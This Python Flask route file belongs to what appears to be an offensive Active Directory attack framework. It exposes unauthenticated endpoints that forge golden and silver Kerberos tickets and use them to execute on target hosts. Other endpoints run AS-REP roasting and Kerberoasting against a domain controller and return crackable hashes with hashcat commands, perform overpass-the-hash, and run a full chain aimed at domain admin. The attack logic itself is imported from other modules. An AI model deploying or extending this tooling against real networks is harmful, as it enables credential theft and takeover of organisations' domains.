"""
Kerberos Attack Routes
======================
API endpoints for Kerberos attack chain and ticket operations
"""

from flask import Blueprint, render_template, request, jsonify
import os
import logging
from datetime import datetime

from cybermodules.kerberos_tickets import KerberosTicketEngine, GoldenTicketForger, SilverTicketForger
from cybermodules.kerberos_chain import (
    KerberosAttackChain,
    ASREPRoaster,
    Kerberoaster,
    OverpassTheHash,
    SilverTicketForger as ChainSilverForger,
    GoldenTicketForger as ChainGoldenForger,
)

logger = logging.getLogger("kerberos_routes")

# Blueprint oluştur
kerberos_bp = Blueprint('kerberos', __name__, url_prefix='/kerberos')


@kerberos_bp.route('/')
def index():
    """Kerberos ana sayfası"""
    return render_template('kerberos.html')


@kerberos_bp.route('/analyze-hash', methods=['POST'])
def analyze_hash():
    """Hash analizi yap"""
    data = request.get_json()
    hash_str = data.get('hash', '')
    
    engine = KerberosTicketEngine(scan_id=0)
    analysis = engine.analyze_hash(hash_str)
    
    return jsonify(analysis)


@kerberos_bp.route('/forge-golden', methods=['POST'])
def forge_golden():
    """Golden Ticket oluştur"""
    data = request.get_json()
    hash_str = data.get('hash', '')
    domain = data.get('domain', '')
    target = data.get('target', '')
    
    engine = KerberosTicketEngine(scan_id=0)
    ticket = engine.forge_golden(hash_str, domain)
    
    if ticket.success:
        # Psexec ile DC'ye bağlan
        if target:
            exec_result = engine.execute_with_ticket(target, ticket)
            return jsonify({
                'success': True,
                'ticket': {
                    'service': ticket.service,
                    'target': ticket.target,
                    'command': ticket.command
                },
                'execution': exec_result
            })
        return jsonify({
            'success': True,
            'ticket': {
                'service': ticket.service,
                'target': ticket.target,
                'command': ticket.command
            }
        })
    else:
        return jsonify({
            'success': False,
            'error': ticket.error
        })


@kerberos_bp.route('/forge-silver', methods=['POST'])
def forge_silver():
    """Silver Ticket oluştur"""
    data = request.get_json()
    hash_str = data.get('hash', '')
    domain = data.get('domain', '')
    service = data.get('service', '')
    target = data.get('target', '')
    
    engine = KerberosTicketEngine(scan_id=0)
    ticket = engine.forge_silver(hash_str, domain, service)
    
    if ticket.success:
        # Psexec ile hedefe bağlan
        if target:
            exec_result = engine.execute_with_ticket(target, ticket)
            return jsonify({
                'success': True,
                'ticket': {
                    'service': ticket.service,
                    'target': ticket.target,
                    'command': ticket.command
                },
                'execution': exec_result
            })
        return jsonify({
            'success': True,
            'ticket': {
                'service': ticket.service,
                'target': ticket.target,
                'command': ticket.command
            }
        })
    else:
        return jsonify({
            'success': False,
            'error': ticket.error
        })


# ============================================================
# NEW: AS-REP ROASTING
# ============================================================

@kerberos_bp.route('/asrep', methods=['POST'])
def asrep_roast():
    """
    AS-REP Roasting Attack
    
    Request:
    {
        "domain": "corp.local",
        "dc_ip": "192.168.1.1",
        "username": "user",
        "password": "pass",
        "userlist": ["user1", ...]
    }
    """
    data = request.get_json()
    
    domain = data.get('domain')
    dc_ip = data.get('dc_ip')
    username = data.get('username')
    password = data.get('password')
    userlist = data.get('userlist')
    
    if not domain or not dc_ip:
        return jsonify({
            'success': False,
            'error': 'domain and dc_ip are required'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    roaster = ASREPRoaster(scan_id)
    
    try:
        users = roaster.enumerate_no_preauth_users(
            domain=domain,
            dc_ip=dc_ip,
            username=username,
            password=password,
            userlist=userlist
        )
        
        crack_cmds = roaster.generate_crack_commands(users)
        
        return jsonify({
            'success': True,
            'users_found': len(users),
            'users': [
                {
                    'username': u.username,
                    'domain': u.domain,
                    'hash': u.as_rep_hash[:50] + '...' if u.as_rep_hash else '',
                    'hashcat_format': u.to_hashcat_format()[:80] + '...'
                }
                for u in users
            ],
            'crack_commands': crack_cmds
        })
        
    except Exception as e:
        logger.error(f"AS-REP roasting failed: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


# ============================================================
# NEW: KERBEROASTING
# ============================================================

@kerberos_bp.route('/kerberoast', methods=['POST'])
def kerberoast():
    """Kerberoasting Attack"""
    data = request.get_json()
    
    domain = data.get('domain')
    dc_ip = data.get('dc_ip')
    username = data.get('username')
    password = data.get('password')
    ntlm_hash = data.get('ntlm_hash')
    target_spn = data.get('target_spn')
    
    if not all([domain, dc_ip, username]) or not (password or ntlm_hash):
        return jsonify({
            'success': False,
            'error': 'domain, dc_ip, username, and password/ntlm_hash are required'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    roaster = Kerberoaster(scan_id)
    
    try:
        hashes = roaster.roast(
            domain=domain,
            dc_ip=dc_ip,
            username=username,
            password=password,
            ntlm_hash=ntlm_hash,
            target_spn=target_spn
        )
        
        crack_cmds = roaster.generate_crack_commands(hashes)
        
        return jsonify({
            'success': True,
            'hashes_found': len(hashes),
            'spns': [
                {
                    'username': h.username,
                    'spn': h.spn,
                    'hash': h.tgs_hash[:50] + '...' if h.tgs_hash else ''
                }
                for h in hashes
            ],
            'crack_commands': crack_cmds
        })
        
    except Exception as e:
        logger.error(f"Kerberoasting failed: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


# ============================================================
# NEW: OVERPASS-THE-HASH
# ============================================================

@kerberos_bp.route('/opth', methods=['POST'])
def overpass_the_hash():
    """Overpass-the-Hash Attack"""
    data = request.get_json()
    
    domain = data.get('domain')
    dc_ip = data.get('dc_ip')
    username = data.get('username')
    ntlm_hash = data.get('ntlm_hash')
    aes_key = data.get('aes_key')
    
    if not all([domain, dc_ip, username]) or not (ntlm_hash or aes_key):
        return jsonify({
            'success': False,
            'error': 'domain, dc_ip, username, and ntlm_hash/aes_key are required'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    opth = OverpassTheHash(scan_id)
    
    try:
        ticket = opth.request_tgt_with_hash(
            domain=domain,
            username=username,
            ntlm_hash=ntlm_hash,
            dc_ip=dc_ip,
            aes_key=aes_key
        )
        
        if ticket:
            return jsonify({
                'success': True,
                'ticket': ticket.to_dict(),
                'ccache_file': ticket.ccache_file,
                'usage': f'export KRB5CCNAME={ticket.ccache_file}'
            })
        else:
            return jsonify({
                'success': False,
                'error': 'Failed to obtain TGT'
            }), 400
            
    except Exception as e:
        logger.error(f"OPTH failed: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


# ============================================================
# NEW: FULL KERBEROS ATTACK CHAIN
# ============================================================

@kerberos_bp.route('/chain', methods=['POST'])
def kerberos_chain():
    """Execute Full Kerberos Attack Chain"""
    data = request.get_json()
    
    domain = data.get('domain')
    dc_ip = data.get('dc_ip')
    
    if not domain or not dc_ip:
        return jsonify({
            'success': False,
            'error': 'domain and dc_ip are required'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    chain = KerberosAttackChain(scan_id)
    
    try:
        result = chain.execute_full_chain(
            domain=domain,
            dc_ip=dc_ip,
            username=data.get('username'),
            password=data.get('password'),
            ntlm_hash=data.get('ntlm_hash'),
            krbtgt_hash=data.get('krbtgt_hash'),
            domain_sid=data.get('domain_sid'),
            target_spn=data.get('target_spn')
        )
        
        return jsonify({
            'success': result.success,
            'chain_id': result.chain_id,
            'domain_admin_achieved': result.domain_admin_achieved,
            'steps': [
                {
                    'name': s.step_name,
                    'status': s.status,
                    'result': s.result
                }
                for s in result.steps
            ],
            'asrep_users': len(result.asrep_users),
            'kerberoast_hashes': len(result.kerberoast_hashes),
            'tickets': len(result.tickets),
            'diagram': chain.generate_attack_diagram()
        })
        
    except Exception as e:
        logger.error(f"Kerberos chain failed: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


# ============================================================
# NEW: TICKET MANAGEMENT
# ============================================================

@kerberos_bp.route('/tickets', methods=['GET'])
def list_tickets():
    """List all forged tickets in /tmp"""
    tickets = []
    
    try:
        for f in os.listdir('/tmp'):
            if f.endswith('.ccache'):
                path = os.path.join('/tmp', f)
                stat = os.stat(path)
                tickets.append({
                    'file': f,
                    'path': path,
                    'size': stat.st_size,
                    'created': datetime.fromtimestamp(stat.st_mtime).isoformat()
                })
        
        return jsonify({
            'success': True,
            'tickets': tickets
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@kerberos_bp.route('/tickets/<filename>', methods=['DELETE'])
def delete_ticket(filename):
    """Delete a forged ticket"""
    path = os.path.join('/tmp', filename)
    
    if not filename.endswith('.ccache'):
        return jsonify({
            'success': False,
            'error': 'Invalid ticket file'
        }), 400
    
    try:
        if os.path.exists(path):
            os.remove(path)
            return jsonify({'success': True})
        else:
            return jsonify({
                'success': False,
                'error': 'Ticket not found'
            }), 404
            
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@kerberos_bp.route('/diagram', methods=['GET'])
def get_diagram():
    """Get Kerberos attack chain diagram"""
    chain = KerberosAttackChain(0)
    return jsonify({
        'diagram': chain.generate_attack_diagram()
    })